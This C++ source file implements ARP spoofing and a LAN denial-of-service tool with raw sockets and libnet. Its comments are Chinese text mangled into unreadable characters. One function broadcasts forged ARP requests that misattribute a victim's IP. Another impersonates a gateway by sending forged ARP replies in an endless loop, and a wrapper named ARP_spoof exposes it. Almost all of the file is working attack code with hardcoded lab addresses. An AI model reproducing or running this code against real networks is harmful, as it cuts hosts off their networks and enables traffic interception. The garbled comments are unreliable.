//#ifndef TCP_DOS_SUPPORT
//#define TCP_DOS_SUPPORT

#include <libnet.h>
#include <string.h>
#include <string>
//#include <stdlib>
#include <iostream>
#include <time.h>
#include <sstream>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <netpacket/packet.h>



#define ETHER_HEADER_LEN sizeof(struct ether_header) /* ÒÔÌ«ÍøÖ¡Ê×²¿³€¶È */

#define ETHER_ARP_LEN sizeof(struct ether_arp) /* Õûžöarpœá¹¹³€¶È */

#define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN + ETHER_ARP_LEN /* ÒÔÌ«Íø + Õûžöarpœá¹¹³€¶È */

#define IP_ADDR_LEN 4 /* IPµØÖ·³€¶È */

#define BROADCAST_ADDR {0xff, 0xff, 0xff, 0xff, 0xff, 0xff} /* ¹ã²¥µØÖ· */

using namespace std;

void err_exit(const char *err_msg)
{
    perror(err_msg);
    exit(1);
}

/* Ìî³äarp°ü */
struct ether_arp *fill_arp_packet(const unsigned char *src_mac_addr, const char *src_ip, const char *dst_ip)
{
    struct ether_arp *arp_packet;
    struct in_addr src_in_addr, dst_in_addr;
    unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;

    /* IPµØÖ·×ª»» */
    inet_pton(AF_INET, src_ip, &src_in_addr);
    inet_pton(AF_INET, dst_ip, &dst_in_addr);

    /* Õûžöarp°ü */
    arp_packet = (struct ether_arp *)malloc(ETHER_ARP_LEN);
    arp_packet->arp_hrd = htons(ARPHRD_ETHER);
    arp_packet->arp_pro = htons(ETHERTYPE_IP);
    arp_packet->arp_hln = ETH_ALEN;
    arp_packet->arp_pln = IP_ADDR_LEN;
    arp_packet->arp_op = htons(ARPOP_REQUEST);
    memcpy(arp_packet->arp_sha, src_mac_addr, ETH_ALEN);
    memcpy(arp_packet->arp_tha, dst_mac_addr, ETH_ALEN);
    memcpy(arp_packet->arp_spa, &src_in_addr, IP_ADDR_LEN);
    memcpy(arp_packet->arp_tpa, &dst_in_addr, IP_ADDR_LEN);

    return arp_packet;
}

/* arpÇëÇó */
void arp_request(char *if_name, char *dst_ip)
{
    struct sockaddr_ll saddr_ll;
    struct ether_header *eth_header;
    struct ether_arp *arp_packet;
    struct ifreq ifr;
    char buf[ETHER_ARP_PACKET_LEN];
    unsigned char src_mac_addr[ETH_ALEN];
    unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;
    char *src_ip;
    int sock_raw_fd, ret_len, i;

    if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
        err_exit("socket()");

    bzero(&saddr_ll, sizeof(struct sockaddr_ll));
    bzero(&ifr, sizeof(struct ifreq));
    /* Íø¿šœÓ¿ÚÃû */
    memcpy(ifr.ifr_name, if_name, strlen(if_name));

    /* »ñÈ¡Íø¿šœÓ¿ÚË÷Òý */
    if (ioctl(sock_raw_fd, SIOCGIFINDEX, &ifr) == -1)
        err_exit("ioctl() get ifindex");
    saddr_ll.sll_ifindex = ifr.ifr_ifindex;
    saddr_ll.sll_family = PF_PACKET;

    /* »ñÈ¡Íø¿šœÓ¿ÚIP */
    if (ioctl(sock_raw_fd, SIOCGIFADDR, &ifr) == -1)
        err_exit("ioctl() get ip");
    src_ip = inet_ntoa(((struct sockaddr_in *)&(ifr.ifr_addr))->sin_addr);
    printf("local ip:%s\n", src_ip);

    /* »ñÈ¡Íø¿šœÓ¿ÚMACµØÖ· */
    if (ioctl(sock_raw_fd, SIOCGIFHWADDR, &ifr))
        err_exit("ioctl() get mac");
    memcpy(src_mac_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    printf("local mac");
    for (i = 0; i < ETH_ALEN; i++)
        printf(":%02x", src_mac_addr[i]);
    printf("\n");

    bzero(buf, ETHER_ARP_PACKET_LEN);
    /* Ìî³äÒÔÌ«Ê×²¿ */
    eth_header = (struct ether_header *)buf;
    memcpy(eth_header->ether_shost, src_mac_addr, ETH_ALEN);
    memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
    eth_header->ether_type = htons(ETHERTYPE_ARP);
    /* arp°ü */
    arp_packet = fill_arp_packet(src_mac_addr, src_ip, dst_ip);
    memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);

    /* ·¢ËÍÇëÇó */
    ret_len = sendto(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
    if ( ret_len > 0)
        printf("sendto() ok!!!\n");

    close(sock_raw_fd);
}

void arp_receive(string dst_ip,unsigned char * dst_mac)
{
    struct ether_arp *arp_packet;
    char buf[ETHER_ARP_PACKET_LEN];
    int sock_raw_fd, ret_len;

    if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
        err_exit("socket()");

    clock_t start, finish;
    double   duration = 0.0;
    start = clock();

    //Ã¿ŽÎµ÷ÓÃarp_reciveœÓÊÕ»ØžŽ°üÊ±ŒäÎª6Ãë£¬³¬Ê±Ö®ºóÖØÐÂµ÷ÓÃarp_requestÖ®ºóÔÙµ÷ÓÃarp_recive

    while (duration<6.0)
    {

    finish = clock();
    duration = (double)(finish - start) / CLOCKS_PER_SEC;

        bzero(buf, ETHER_ARP_PACKET_LEN);
        ret_len = recv(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0);
        if (ret_len > 0)
        {
            /* °þÈ¥ÒÔÌ«Í·²¿ */
            arp_packet = (struct ether_arp *)(buf + ETHER_HEADER_LEN);
            /* arp²Ù×÷ÂëÎª2Žú±íarpÓŠŽð */
            if (ntohs(arp_packet->arp_op) == 2)
            {
        stringstream stream[4];
        string tmp;
        string d;

        for(int i= 0; i<4;i++)
        {
            unsigned int p = arp_packet->arp_spa[i];
            stream[i] << p;
            stream[i] >> d;
            tmp.append(d);
            if(i<3)
            {
            tmp+=".";
            }

        }


        if(tmp == dst_ip)
        {
            for(int j=0;j<6;j++)
            {
            dst_mac[j] = arp_packet->arp_sha[j];
            }
            break;
        }
            }
        }
    }

    close(sock_raw_fd);
}


string create_random_IP()
{
    srand((unsigned)time(0));
    stringstream stream[4];
    string tmp;
    string d;

    for(int i=0;i<4;i++)
    {
        unsigned int p = rand()%256;
        stream[i] << p;
        stream[i] >> d;
        tmp.append(d);
        if(i<3)
        {
            tmp+=".";
        }

    }
    //cout<<tmp.data()<<endl;
    return tmp;
}



int ARP_block_single_host_in(string dev,string src_ip_s)
{
    //žÃº¯Êý×è¶ÏÄ¿±ê»úÆ÷œÓÊÜÍâ²¿·¢ËÍÏòžÃÖ÷»úµÄÊýŸÝ°ü(¶ÔÍø¶ÎÄÚÆäËûÖ÷»ú¹ã²¥Ò»žöŒÙµÄÄ¿±êÖ÷»úµÄmacµØÖ·)
    libnet_t *handle;        /* LibnetŸä±ú */
    int packet_size;

    srand((unsigned)time(0));
//    string dst_ip_s = create_random_IP();

    string dst_ip_s = "192.168.161.141";
    char *device = "eth0";   /* Éè±žÃû×Ö,Ò²Ö§³ÖµãÊ®œøÖÆµÄIPµØÖ·,»á×ÔŒºÕÒµœÆ¥ÅäµÄÉè±ž */

//    u_int8_t *src_ip_str = "192.168.128.200";       /* ÔŽIPµØÖ·×Ö·ûŽ® */   //ÕâÀïÊÇ±»¹¥»÷µÄÄ¿±êÖ÷»úµÄIPµØÖ·
//    u_int8_t *dst_ip_str = "192.168.128.88";        /* Ä¿µÄIPµØÖ·×Ö·ûŽ® */ //ÕâžöÆäÊµ²»ÖØÒªÒòÎªÊÇarp¹ã²¥°ü

//    00:0c:29:d2:49:3b

    u_int8_t src_mac[6] = {0x00, 0x0c, 0x29, 0x73, 0xfa, 0x86};/* ÔŽMAC */
    u_int8_t dst_mac[6] = {0x00, 0x0c, 0x29, 0xd7, 0x95, 0x67};/* Ä¿µÄMAC,¹ã²¥µØÖ· */

    /* œÓÊÕ·œMAC,ARPÇëÇóÄ¿µÄŸÍÊÇÒªÑ¯ÎÊ¶Ô·œMAC,ËùÒÔÕâÀïÌîÐŽ0 */
    u_int8_t rev_mac[6] = {0x00, 0x0C, 0x29, 0xD2, 0x49, 0x3B};
    u_int32_t dst_ip, src_ip;              /* ÍøÂ·ÐòµÄÄ¿µÄIPºÍÔŽIP */
    char error[LIBNET_ERRBUF_SIZE];        /* ³öŽíÐÅÏ¢ */
    libnet_ptag_t arp_proto_tag, eth_proto_tag;

    /* °ÑÄ¿µÄIPµØÖ·×Ö·ûŽ®×ª»¯³ÉÍøÂçÐò */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* °ÑÔŽIPµØÖ·×Ö·ûŽ®×ª»¯³ÉÍøÂçÐò */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);

    if ( dst_ip == -1 || src_ip == -1 ) {
        printf("ip address convert error\n");
        exit(-1);
    };
    /* ³õÊŒ»¯Libnet,×¢ÒâµÚÒ»žö²ÎÊýºÍTCP³õÊŒ»¯²»Í¬ */
    if ( (handle = libnet_init(LIBNET_LINK_ADV, dev.data(), error)) == NULL ) {
        printf("libnet_init: error [%s]\n", error);
        exit(-2);
    };

    /* ¹¹ÔìarpÐ­Òé¿é */
    arp_proto_tag = libnet_build_arp(
                ARPHRD_ETHER,        /* Ó²ŒþÀàÐÍ,1±íÊŸÒÔÌ«ÍøÓ²ŒþµØÖ· */
                ETHERTYPE_IP,        /* 0x0800±íÊŸÑ¯ÎÊIPµØÖ· */
                6,                   /* Ó²ŒþµØÖ·³€¶È */
                4,                   /* IPµØÖ·³€¶È */
                ARPOP_REQUEST,       /* ²Ù×÷·œÊœ:ARPÇëÇó */
                src_mac,             /* source MAC addr */
                (u_int8_t *)&src_ip, /* src proto addr */
                rev_mac,             /* dst MAC addr */
                (u_int8_t *)&dst_ip, /* dst IP addr */
                NULL,                /* no payload */
                0,                   /* payload length */
                handle,              /* libnet tag */
                0                    /* Create new one */
    );
    if (arp_proto_tag == -1)    {
        printf("build IP failure\n");
        exit(-3);
    };

    /* ¹¹ÔìÒ»žöÒÔÌ«ÍøÐ­Òé¿é
    You should only use this function when
    libnet is initialized with the LIBNET_LINK interface.*/
    eth_proto_tag = libnet_build_ethernet(
        dst_mac,         /* ÒÔÌ«ÍøÄ¿µÄµØÖ· */
        src_mac,         /* ÒÔÌ«ÍøÔŽµØÖ· */
        ETHERTYPE_ARP,   /* ÒÔÌ«ÍøÉÏ²ãÐ­ÒéÀàÐÍ£¬ŽËÊ±ÎªARPÇëÇó */
        NULL,            /* žºÔØ£¬ÕâÀïÎª¿Õ */
        0,               /* žºÔØŽóÐ¡ */
        handle,          /* LibnetŸä±ú */
        0                /* Ð­Òé¿é±êŒÇ£¬0±íÊŸ¹¹ÔìÒ»žöÐÂµÄ */
    );
    if (eth_proto_tag == -1) {
        printf("build eth_header failure\n");
        return (-4);
    };

    packet_size = libnet_write(handle);    /* ·¢ËÍÒÑŸ­¹¹ÔìµÄÊýŸÝ°ü*/

    libnet_destroy(handle);                /* ÊÍ·ÅŸä±ú */

    return (0);
}

int ARP_block_single_host_out(string dst_ip_s,string src_ip_s,string dstmac)
{

    unsigned char sender_mac_addr[ETH_ALEN];
    int sock_raw_fd, i;

    if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
        err_exit("socket()");

    struct ifreq ifr;
    bzero(&ifr, sizeof(struct ifreq));
    char* if_name="eth0";
    memcpy(ifr.ifr_name, if_name, strlen(if_name));

    if (ioctl(sock_raw_fd, SIOCGIFHWADDR, &ifr))
        err_exit("ioctl() get mac");
    memcpy(sender_mac_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

    u_char sender_mac[6];
    for(int i=0;i<6;i++){
        sender_mac[i]=sender_mac_addr[i];
    }
    u_char target_mac[6]; /* Ä¿µÄMAC */
    string tmp[6];

    for(int i=0;i<6;i++)
    {
        tmp[i].resize(2);
        tmp[i][0]=dstmac[i*3];
        tmp[i][1]=dstmac[i*3+1];
//        printf("tmp:%s\n",tmp[i].data());
    }
    int macvalues[6];
    for(int i=0;i<6;i++)
    {
        macvalues[i]=0;
        for(int j=0;j<2;j++)
        {
            int tmpa=0;
            switch (tmp[i][j]) {
            case '0':
                tmpa=0;
                break;
            case '1':
                tmpa=1;
                break;
            case '2':
                tmpa=2;
                break;
            case '3':
                tmpa=3;
                break;
            case '4':
                tmpa=4;
                break;
            case '5':
                tmpa=5;
                break;
            case '6':
                tmpa=6;
                break;
            case '7':
                tmpa=7;
                break;
            case '8':
                tmpa=8;
                break;
            case '9':
                tmpa=9;
                break;
            case 'a':
                tmpa=10;
                break;
            case 'b':
                tmpa=11;
                break;
            case 'c':
                tmpa=12;
                break;
            case 'd':
                tmpa=13;
                break;
            case 'e':
                tmpa=14;
                break;
            case 'f':
                tmpa=15;
                break;
            default:
                break;
            }

            if(j==0)
                macvalues[i]+=16*tmpa;
            else
                macvalues[i]+=tmpa;
        }
    }

    stringstream tmpss[6];
    for(int i=0; i<6; i++){
        target_mac[i]=macvalues[i];
    }




    //žÃº¯Êý×è¶ÏÄ¿±ê»úÆ÷ÏòÍâ²¿·¢ËÍÊýŸÝ°üµÄ¹ŠÄÜ(¶ÔžÃ»úÆ÷ÉùÃ÷Ò»žöŒÙµÄÍø¹ØmacµØÖ·)
    //dst_ip_sžÉÈÅµÄÄ¿±êIP
    //src_ip_sÃ°³äµÄÍø¹ØIP
    libnet_t *handle;        /* LibnetŸä±ú */
    int packet_size;

    //char *device = "eth0";    /* Éè±žÃû×Ö,Ò²Ö§³ÖµãÊ®œøÖÆµÄIPµØÖ·,»á×ÔŒºÕÒµœÆ¥ÅäµÄÉè±ž */

    //u_int8_t *src_ip_str = "192.168.2.30";        /* Ã°³äµÄÍø¹ØIP */
    //u_int8_t *dst_ip_str = "192.168.2.170";        /* žÉÈÅµÄÄ¿±êIP */
//    00:0c:29:d2:49:3b
//    u_int8_t src_mac[6] = {0x00, 0x0c, 0x29, 0xd2, 0x49, 0x3b};/* ÐéŒÙµÄÔŽMAC */

//    00:50:56:ef:d3:8a
//    u_int8_t dst_mac[6] = {0x00,0x0c,0x29,0x45,0xa6,0x48};/* žÉÈÅµÄÄ¿±êMAC */


//    while((int)dst_mac[0]==0 && (int)dst_mac[1]==0 && (int)dst_mac[2]==0 && (int)dst_mac[3]==0 && (int)dst_mac[4]==0 && (int)dst_mac[5]==0)
//    {
//        arp_request((char*)dev.data(), (char*)dst_ip_s.data());
//        arp_receive(dst_ip_s,(unsigned char*)dst_mac);
//    }


    u_int32_t target_ip, sender_ip;                /* ÍøÂ·ÐòµÄÄ¿µÄIPºÍÔŽIP */
    char error[LIBNET_ERRBUF_SIZE];        /* ³öŽíÐÅÏ¢ */
    libnet_ptag_t arp_proto_tag, eth_proto_tag;

    /* °ÑÄ¿µÄIPµØÖ·×Ö·ûŽ®×ª»¯³ÉÍøÂçÐò */
    target_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* °ÑÔŽIPµØÖ·×Ö·ûŽ®×ª»¯³ÉÍøÂçÐò */
    sender_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);

    if ( target_ip == -1 || sender_ip == -1 ) {
        printf("ip address convert error\n");
        exit(-1);
    };
    /* ³õÊŒ»¯Libnet,×¢ÒâµÚÒ»žö²ÎÊýºÍTCP³õÊŒ»¯²»Í¬ */
    if ( (handle = libnet_init(LIBNET_LINK_ADV, if_name, error)) == NULL ) {
        printf("libnet_init: error [%s]\n", error);
        exit(-2);
    };

    /* ¹¹ÔìarpÐ­Òé¿é */
    arp_proto_tag = libnet_build_arp(
                ARPHRD_ETHER,        /* Ó²ŒþÀàÐÍ,1±íÊŸÒÔÌ«ÍøÓ²ŒþµØÖ· */
                ETHERTYPE_IP,        /* 0x0800±íÊŸÑ¯ÎÊIPµØÖ· */
                6,                    /* Ó²ŒþµØÖ·³€¶È */
                4,                    /* IPµØÖ·³€¶È */
                ARPOP_REPLY,        /* ²Ù×÷·œÊœ:ARPÇëÇó */
                sender_mac,                /* source MAC addr */
                (u_int8_t *)&sender_ip,    /* src proto addr */
                target_mac,                /* dst MAC addr */
                (u_int8_t *)&target_ip,    /* dst IP addr */
                NULL,                /* no payload */
                0,                    /* payload length */
                handle,                /* libnet tag */
                0                    /* Create new one */
    );
    if (arp_proto_tag == -1)    {
        printf("build IP failure\n");
        exit(-3);
    };

    /* ¹¹ÔìÒ»žöÒÔÌ«ÍøÐ­Òé¿é
    You should only use this function when
    libnet is initialized with the LIBNET_LINK interface.*/
    eth_proto_tag = libnet_build_ethernet(
        target_mac,            /* ÒÔÌ«ÍøÄ¿µÄµØÖ· */
        sender_mac,            /* ÒÔÌ«ÍøÔŽµØÖ· */
        ETHERTYPE_ARP,    /* ÒÔÌ«ÍøÉÏ²ãÐ­ÒéÀàÐÍ£¬ŽËÊ±ÎªARPÇëÇó */
        NULL,            /* žºÔØ£¬ÕâÀïÎª¿Õ */
        0,                /* žºÔØŽóÐ¡ */
        handle,            /* LibnetŸä±ú */
        0                /* Ð­Òé¿é±êŒÇ£¬0±íÊŸ¹¹ÔìÒ»žöÐÂµÄ */
    );
    if (eth_proto_tag == -1)    {
        printf("build eth_header failure\n");
        return (-4);
    };

    while(1) {
        packet_size = libnet_write(handle);        /* ËÀÑ­»··¢ËÍarpÆÛÆ­¹ã²¥ */
        usleep(1000);
    };

    libnet_destroy(handle);                /* ÊÍ·ÅŸä±ú */

    return (0);
}

int ARP_spoof(string target_ip,string sender_ip,string target_mac)
{
    ARP_block_single_host_out(target_ip,sender_ip,target_mac);
    return 0;
}

//#endif

